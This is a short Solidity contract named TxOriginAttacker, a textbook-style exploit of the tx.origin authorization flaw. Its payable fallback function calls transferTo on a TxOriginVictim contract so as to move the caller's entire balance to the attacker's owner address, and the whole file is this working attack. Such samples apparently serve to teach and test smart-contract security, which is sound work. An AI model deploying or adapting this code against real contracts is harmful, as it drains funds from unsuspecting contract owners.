
contract TxOriginAttacker {
    address public owner;
    function TxOriginAttacker() public {
      owner = msg.sender;
    }

    function() payable public {
      TxOriginVictim(msg.sender).transferTo(owner, msg.sender.balance);
    }
    
    function getBalance() public constant returns (uint256) {
        return this.balance;
    }
}